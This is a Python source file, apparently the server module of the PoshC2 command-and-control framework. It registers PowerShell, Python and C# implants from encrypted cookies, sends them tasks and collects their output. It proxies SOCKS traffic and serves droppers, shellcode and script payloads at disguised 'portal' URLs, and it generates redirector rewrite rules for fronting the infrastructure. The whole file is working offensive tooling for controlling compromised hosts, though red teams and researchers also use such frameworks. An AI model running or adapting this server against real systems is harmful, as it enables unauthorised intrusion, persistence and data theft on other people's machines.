#!/usr/bin/env python3

import os, sys, datetime, time, base64, logging, signal, re, ssl, traceback, threading
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
from socketserver import ThreadingMixIn
from http.server import BaseHTTPRequestHandler, HTTPServer
from poshc2.server.Implant import Implant
from poshc2.server.Tasks import newTask, newTaskOutput
from poshc2.server.Core import decrypt, encrypt, default_response, decrypt_bytes_gzip, number_of_days, process_mimikatz, print_bad
from poshc2.Colours import Colours
from poshc2.server.Payloads import Payloads
from poshc2.server.Config import PoshProjectDirectory, ServerHeader, PayloadsDirectory, GET_404_Response, DownloadsDirectory, Database, PayloadCommsHost, SocksHost
from poshc2.server.Config import QuickCommand, KillDate, DefaultSleep, DomainFrontHeader, urlConfig, BindIP, BindPort
from poshc2.server.Config import DownloadURI, Sounds, URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken
from poshc2.server.Config import Pushover_APIUser, EnableNotifications, DatabaseType
from poshc2.server.Cert import create_self_signed_cert
from poshc2.client.Help import logopic
from poshc2.Utils import validate_sleep_time, randomuri, gen_key
from poshc2.server.database.Model import CachedUrls


if DatabaseType.lower() == "postgres":
    from poshc2.server.database.DBPostgres import update_sleep, select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
    from poshc2.server.database.DBPostgres import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey, get_c2_messages, database_connect
    from poshc2.server.database.DBPostgres import get_db, update_cache_urls, insert_hosted_file
else:
    from poshc2.server.database.DBSQLite import update_sleep, select_item, get_implants_all, update_implant_lastseen, update_task, get_cmd_from_task_id, get_c2server_all, get_sharpurls
    from poshc2.server.database.DBSQLite import update_item, get_task_owner, get_newimplanturl, initializedb, setupserver, new_urldetails, get_baseenckey, get_c2_messages, database_connect
    from poshc2.server.database.DBSQLite import update_cache_urls, insert_hosted_file

new_implant_url = None
sharpurls = None
cached_urls = None
QuickCommandURI = None
KEY = None

class MyHandler(BaseHTTPRequestHandler):

    def signal_handler(self, signal, frame):
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    def log_message(self, format, *args):
        try:
            useragent = str(self.headers['user-agent'])
        except Exception:
            useragent = "None"

        open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] %s %s\n" %
                                                     (self.address_string(), self.log_date_time_string(), format % args, useragent))

    def do_HEAD(self):
        """Respond to a HEAD request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_OPTIONS(self):
        """Respond to a HEAD request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_PUT(self):
        """Respond to a PUT request."""
        self.server_version = ServerHeader
        self.sys_version = ""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        try:
            """Respond to a GET request."""
            response_content_len = None
            response_code = 200
            response_content_type = "text/html"
            response_content = None

            cached_urls = update_cache_urls()

            logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))

            self.cookieHeader = self.headers.get('Cookie')
            self.ref = self.headers.get('Referer')

            UriPath = str(self.path)
            sharplist = []
            for i in sharpurls:
                i = i.replace(" ", "")
                i = i.replace("\"", "")
                sharplist.append("/" + i)

            self.server_version = ServerHeader
            self.sys_version = ""
            if not self.cookieHeader:
                self.cookieHeader = "NONE"

            # implant gets a new task
            new_task = newTask(self.path)

            if new_task:
                response_content = new_task

            elif [ele for ele in sharplist if(ele in UriPath)]:
                try:
                    open("%swebserver.log" % PoshProjectDirectory, "a").write("%s - [%s] Making GET connection to SharpSocks %s%s\r\n" % (self.address_string(), self.log_date_time_string(), SocksHost, UriPath))
                    r = Request("%s%s" % (SocksHost, UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie': '%s' % self.cookieHeader, 'User-Agent': UserAgent})
                    res = urlopen(r)
                    sharpout = res.read()
                    response_content_len = len(sharpout)
                    if (len(sharpout) > 0):
                        response_content = sharpout
                except HTTPError as e:
                    response_code = e.code
                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                except Exception as e:
                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                    open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                    print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {self.client_address[0]} {UriPath}" + Colours.END)
                    response_code = 404
                    HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                    if HTTPResponsePage:
                        response_content = bytes(HTTPResponsePage, "utf-8")
                    else:
                        response_content = bytes(GET_404_Response, "utf-8")

            # dynamically hosted files
            elif [ele for ele in cached_urls if(ele[1] in self.path)]:
                for i in cached_urls:
                    URL = CachedUrls(i[0], i[1], i[2], i[3], i[4], i[5])
                    if URL.URI == self.path or f"/{URL.URI}" == self.path and URL.Active == "Yes":
                        try:
                            response_content = open(URL.FilePath, 'rb').read()
                        except FileNotFoundError as e:
                            print_bad(f"Hosted file not found (src_addr: {self.client_address[0]}): {URL.URI} -> {e.filename}")
                        response_content_type = URL.ContentType
                        if URL.Base64 == "Yes":
                            response_content = base64.b64encode(response_content)

                        # do this for the python dropper only
                        if "_py" in URL.URI:
                            response_content = "a" + "".join("{:02x}".format(c) for c in response_content)
                            response_content = bytes(response_content, "utf-8")

            # register new implant
            elif new_implant_url in self.path and self.cookieHeader.startswith("SessionID"):
                implant_type = "PS"
                if self.path == ("%s?p" % new_implant_url):
                    implant_type = "PS Proxy"
                if self.path == ("%s?d" % new_implant_url):
                    implant_type = "PS Daisy"
                if self.path == ("%s?m" % new_implant_url):
                    implant_type = "Python"
                if self.path == ("%s?d?m" % new_implant_url):
                    implant_type = "Python Daisy"
                if self.path == ("%s?p?m" % new_implant_url):
                    implant_type = "Python Proxy"
                if self.path == ("%s?c" % new_implant_url):
                    implant_type = "C#"
                if self.path == ("%s?d?c" % new_implant_url):
                    implant_type = "C# Daisy"
                if self.path == ("%s?p?c" % new_implant_url):
                    implant_type = "C# Proxy"

                if implant_type.startswith("C#"):
                    cookieVal = (self.cookieHeader).replace("SessionID=", "")
                    decCookie = decrypt(KEY, cookieVal)
                    IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                    Domain, User, Hostname, Arch, PID, URLID = decCookie.split(";")
                    URLID = URLID.replace("\x00", "")
                    if "\\" in User:
                        User = User[User.index("\\") + 1:]
                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, int(URLID))
                    newImplant.save()
                    newImplant.display()
                    newImplant.autoruns()
                    response_content = encrypt(KEY, newImplant.SharpCore)

                elif implant_type.startswith("Python"):
                    cookieVal = (self.cookieHeader).replace("SessionID=", "")
                    decCookie = decrypt(KEY, cookieVal)
                    IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                    User, Domain, Hostname, Arch, PID, URLID = decCookie.split(";")
                    URLID = URLID.replace("\x00", "")
                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, URLID)
                    newImplant.save()
                    newImplant.display()
                    response_content = encrypt(KEY, newImplant.PythonCore)
                else:
                    try:
                        cookieVal = (self.cookieHeader).replace("SessionID=", "")
                        decCookie = decrypt(KEY.encode("utf-8"), cookieVal)
                        decCookie = str(decCookie)
                        Domain, User, Hostname, Arch, PID, URLID = decCookie.split(";")
                        URLID = URLID.replace("\x00", "")
                        IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
                        if "\\" in str(User):
                            User = User[str(User).index('\\') + 1:]
                        newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, URLID)
                        newImplant.save()
                        newImplant.display()
                        newImplant.autoruns()
                        response_content = encrypt(KEY, newImplant.PSCore)
                    except Exception as e:
                        print("Decryption error: %s" % e)
                        traceback.print_exc()
                        response_code = 404
                        HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                        if HTTPResponsePage:
                            response_content = bytes(HTTPResponsePage, "utf-8")
                        else:
                            response_content = bytes(GET_404_Response, "utf-8")
            else:
                response_code = 404
                HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                if HTTPResponsePage:
                    response_content = bytes(HTTPResponsePage, "utf-8")
                else:

                    response_content = bytes(GET_404_Response, "utf-8")

            # send response
            self.send_response(response_code)
            self.send_header("Content-type", response_content_type)
            if response_content_len is not None:
                self.send_header("Connection", "close")
                self.send_header("Content-Length", response_content_len)
            self.end_headers()

            if response_content is not None:
                self.wfile.write(response_content)

        except Exception as e:
            if 'broken pipe' not in str(e).lower():
                print_bad("Error handling GET request: " + str(e))
                traceback.print_exc()

    def do_POST(self):
        try:
            """Respond to a POST request."""
            response_content_len = None
            response_code = 200
            response_content_type = "text/html"
            response_content = None

            self.server_version = ServerHeader
            self.sys_version = ""
            try:
                content_length = int(self.headers['Content-Length'])
            except:
                content_length = 0
            self.cookieHeader = self.headers.get('Cookie')
            try:
                cookieVal = (self.cookieHeader).replace("SessionID=", "")
            except:
                cookieVal = ""

            post_data = self.rfile.read(content_length)
            logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers), post_data)
            newTaskOutput(self.path, cookieVal, post_data)

        except Exception as e:
            if 'broken pipe' not in str(e).lower():
                print_bad("Error handling POST request: " + str(e))
                traceback.print_exc()

        finally:
            try:
                UriPath = str(self.path)
                sharplist = []
                for implant in sharpurls:
                    implant = implant.replace(" ", "")
                    implant = implant.replace("\"", "")
                    sharplist.append("/" + implant)

                if [ele for ele in sharplist if(ele in UriPath)]:
                    try:
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[+] Making POST connection to SharpSocks %s%s\r\n" % (SocksHost, UriPath))
                        r = Request("%s%s" % (SocksHost, UriPath), headers={'Cookie': '%s' % self.cookieHeader, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'})
                        res = urlopen(r, post_data)
                        sharpout = res.read()
                        response_code = res.getcode()
                        response_content_len = len(sharpout)
                        if (len(sharpout) > 0):
                            response_content = sharpout
                    except URLError as e:
                        try:
                            response_code = res.getcode()
                        except:
                            response_code = 500
                        try:
                            response_code = len(sharpout)
                        except:
                            response_code = 0
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] URLError with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                    except Exception as e:
                        response_code = res.getcode()
                        response_content_len = len(sharpout)
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                        open("%swebserver.log" % PoshProjectDirectory, "a").write("[-] SharpSocks  %s\r\n" % e)
                        print(Colours.RED + f"Unknown C2 comms incoming (Could be old implant or sharpsocks) - {self.client_address[0]} {UriPath}" + Colours.END)
                        response_code = 404
                        HTTPResponsePage = select_item("GET_404_Response", "C2Server")
                        if HTTPResponsePage:
                            response_content = bytes(HTTPResponsePage, "utf-8")
                        else:
                            response_content = bytes(GET_404_Response, "utf-8")
                else:
                    response_content = default_response()

                # send response
                self.send_response(response_code)
                self.send_header("Content-type", response_content_type)
                if response_content_len is not None:
                    self.send_header("Connection", "close")
                    self.send_header("Content-Length", response_content_len)
                self.end_headers()
                if response_content is not None:
                    self.wfile.write(response_content)

            except Exception as e:
                print(Colours.RED + "Generic error in POST request!" + Colours.END)
                print(Colours.RED + UriPath + Colours.END)
                print(str(e))
                traceback.print_exc()


ThreadingMixIn.daemon_threads = True


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


def newdb(db):
    print("Initializing new project folder and %s database" % db + Colours.GREEN)
    print("")
    directory = os.path.dirname(PoshProjectDirectory)
    if not os.path.exists(directory): os.makedirs(directory)
    if not os.path.exists("%s/downloads" % directory): os.makedirs("%s/downloads" % directory)
    if not os.path.exists("%s/reports" % directory): os.makedirs("%s/reports" % directory)
    if not os.path.exists("%s/payloads" % directory): os.makedirs("%s/payloads" % directory)
    initializedb()
    if not validate_sleep_time(DefaultSleep):
        print(Colours.RED)
        print("Invalid DefaultSleep in config, please specify a time such as 50s, 10m or 1h")
        print(Colours.GREEN)
        sys.exit(1)
    setupserver(PayloadCommsHost, gen_key().decode("utf-8"), DomainFrontHeader, DefaultSleep, KillDate, GET_404_Response, PoshProjectDirectory, QuickCommand, DownloadURI, "", "", "", Sounds, URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken, Pushover_APIUser, EnableNotifications)
    rewriteFile = "%s/rewrite-rules.txt" % directory
    print("Creating Rewrite Rules in: " + rewriteFile)
    rewriteHeader = ["RewriteEngine On", "SSLProxyEngine On", "SSLProxyCheckPeerCN Off", "SSLProxyVerify none", "SSLProxyCheckPeerName off", "SSLProxyCheckPeerExpire off", "# Change IPs to point at C2 infrastructure below", "Define PoshC2 10.0.0.1", "Define SharpSocks 10.0.0.1"]
    rewriteFileContents = rewriteHeader + urlConfig.fetchRewriteRules() + urlConfig.fetchSocksRewriteRules()
    with open(rewriteFile, 'w') as outFile:
        for line in rewriteFileContents:
            outFile.write(line)
            outFile.write('\n')
        outFile.close()

    C2 = get_c2server_all()
    urlId = new_urldetails("default", C2.PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
    newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory, URLID = urlId)

    newPayload.CreateAll()

    create_self_signed_cert(PoshProjectDirectory)
    newPayload.WriteQuickstart(directory + '/quickstart.txt')

    # adding default hosted payloads
    QuickCommandURI = select_item("QuickCommand", "C2Server")
    insert_hosted_file("%ss/86/portal" % QuickCommandURI, "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
    insert_hosted_file("%ss/64/portal" % QuickCommandURI, "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory), "text/html", "Yes", "Yes")
    insert_hosted_file("%sp/86/portal" % QuickCommandURI, "%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
    insert_hosted_file("%sp/64/portal" % QuickCommandURI, "%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
    insert_hosted_file("%s_ex86" % QuickCommandURI, "%sPosh_v4_dropper32.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
    insert_hosted_file("%s_ex64" % QuickCommandURI, "%sPosh_v4_dropper64.exe" % (PayloadsDirectory), "application/x-msdownload", "No", "Yes")
    insert_hosted_file("%s_bs" % QuickCommandURI, "%spayload.bat" % (PayloadsDirectory), "text/html", "No", "Yes")
    insert_hosted_file("%s_rp" % QuickCommandURI, "%spayload.txt" % (PayloadsDirectory), "text/html", "Yes", "Yes")
    insert_hosted_file("%s_rg" % QuickCommandURI, "%srg_sct.xml" % (PayloadsDirectory), "text/html", "No", "Yes")
    insert_hosted_file("%s_cs" % QuickCommandURI, "%scs_sct.xml" % (PayloadsDirectory), "text/html", "No", "Yes")
    insert_hosted_file("%s_py" % QuickCommandURI, "%saes.py" % (PayloadsDirectory), "text/html", "No", "Yes")

def existingdb(db):
    print("Using existing %s database / project" % db + Colours.GREEN)
    database_connect()
    C2 = get_c2server_all()
    if ((C2.PayloadCommsHost == PayloadCommsHost) and (C2.DomainFrontHeader == DomainFrontHeader)):
        qstart = "%squickstart.txt" % (PoshProjectDirectory)
        if os.path.exists(qstart):
            with open(qstart, 'r') as f:
                print(f.read())
    else:
        print("Error different IP so regenerating payloads")
        if os.path.exists("%spayloads_old" % PoshProjectDirectory):
            import shutil
            shutil.rmtree("%spayloads_old" % PoshProjectDirectory)
        os.rename("%spayloads" % PoshProjectDirectory, "%spayloads_old" % PoshProjectDirectory)
        os.makedirs("%spayloads" % PoshProjectDirectory)
        C2 = get_c2server_all()
        urlId = new_urldetails("updated_host", PayloadCommsHost, C2.DomainFrontHeader, "", "", "", "")
        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, get_newimplanturl(), PayloadsDirectory, URLID = urlId)
        update_item("PayloadCommsHost", "C2Server", PayloadCommsHost)
        update_item("QuickCommand", "C2Server", QuickCommand)
        update_item("DomainFrontHeader", "C2Server", DomainFrontHeader)
        newPayload.CreateAll()
        newPayload.WriteQuickstart(PoshProjectDirectory + 'quickstart.txt')


def log_c2_messages():
    while True:
        messages = get_c2_messages()
        if messages is not None:
            for message in messages:
                print(message)
        time.sleep(2)


def main(args):
    httpd = ThreadedHTTPServer((BindIP, BindPort), MyHandler)
    global new_implant_url, sharpurls, cached_urls, KEY, QuickCommandURI

    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except Exception:
        print("cls")
    print(chr(27) + "[2J")
    print(Colours.GREEN + logopic)
    print(Colours.END + "")

    if DatabaseType.lower() == "postgres":
        try:
            if get_db() > 0:
                if len(os.listdir(PoshProjectDirectory)) > 2:
                    existingdb("postgres")
                else:
                    print(Colours.RED + "[-] Project directory does not exist or is empty \n")
                    print(Colours.RED + "[>] Create new postgres DB and remove dir (%s) \n" % PoshProjectDirectory)
                    sys.exit(1)
            else:
                newdb("postgres")
        except Exception as e:
            print(str(e))
            traceback.print_exc()
            print(Colours.RED + "[>] Create new postgres DB and remove dir (%s) \n" % PoshProjectDirectory)
            sys.exit(1)
    elif os.path.isfile(Database):
        if len(os.listdir(PoshProjectDirectory)) > 2:
            existingdb("sqlite")
        else:
            print(Colours.RED + "[-] Project directory does not exist (%s) \n" % PoshProjectDirectory)
            sys.exit(1)
    else:
        newdb("sqlite")

    C2 = get_c2server_all()
    print("" + Colours.GREEN)
    print("CONNECT URL: " + get_newimplanturl() + Colours.GREEN)
    print("QUICKCOMMAND URL: " + select_item("QuickCommand", "C2Server") + Colours.GREEN)
    print("WEBSERVER Log: %swebserver.log" % PoshProjectDirectory)
    print("")
    print("PayloadCommsHost: " + select_item("PayloadCommsHost", "C2Server") + Colours.GREEN)
    print("DomainFrontHeader: " + str(select_item("DomainFrontHeader", "C2Server")) + Colours.GREEN)
    QuickCommandURI = select_item("QuickCommand", "C2Server")
    KEY = get_baseenckey()
    new_implant_url = get_newimplanturl()
    sharpurls= get_sharpurls().split(",")
    cached_urls = update_cache_urls()

    print("")
    print(time.asctime() + " PoshC2 Server Started - %s:%s" % (BindIP, BindPort))
    from datetime import date, datetime
    killdate = datetime.strptime(C2.KillDate, '%d/%m/%Y').date()
    datedifference = number_of_days(date.today(), killdate)
    if datedifference < 8:
        print(Colours.RED + ("\nKill Date is - %s - expires in %s days" % (C2.KillDate, datedifference)))
    else:
        print(Colours.GREEN + ("\nKill Date is - %s - expires in %s days" % (C2.KillDate, datedifference)))
    print(Colours.END)

    if "https://" in PayloadCommsHost.strip():
        if (os.path.isfile("%sposh.crt" % PoshProjectDirectory)) and (os.path.isfile("%sposh.key" % PoshProjectDirectory)):
            try:
                httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="%sposh.key" % PoshProjectDirectory, certfile="%sposh.crt" % PoshProjectDirectory, server_side=True, ssl_version=ssl.PROTOCOL_TLS)
            except Exception:
                httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="%sposh.key" % PoshProjectDirectory, certfile="%sposh.crt" % PoshProjectDirectory, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
        else:
            raise ValueError("Cannot find the certificate files")

    c2_message_thread = threading.Thread(target=log_c2_messages, daemon=True)
    c2_message_thread.start()

    try:
        httpd.serve_forever()
    except (KeyboardInterrupt, EOFError):
        httpd.server_close()
        print(time.asctime() + " PoshC2 Server Stopped - %s:%s" % (BindIP, BindPort))
        sys.exit(0)


if __name__ == '__main__':
    args = sys.argv
    main(args)
